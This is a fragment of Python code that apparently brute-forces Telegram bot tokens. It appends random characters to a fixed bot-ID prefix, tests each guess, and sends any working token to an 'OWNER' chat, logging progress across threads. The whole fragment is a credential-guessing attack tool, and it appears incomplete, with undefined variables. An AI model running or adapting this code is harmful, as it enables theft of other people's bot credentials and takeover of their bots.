#ADMlNxd 2.0
token = "609517172:AA" + "".join(random.choices(chars,k=33))
new_bot = Bot(token)
for k in range(500):
  try:
    username = new_bot.username
    if username:
      print(token)
      LOGGING(username)
      new_bot.send_message(OWNER, token)
      LOGGING("Har Har Mahadev 🚩")
  except:
    pass
  if botNo == THREAD_COUNT - 1:
    ATTEMPT += 1
    if ATTEMPT % 1000 == 0:
      LOGGING("```{}``` Group have completed {} attempt".format(GROUP_NAME, ATTEMPT))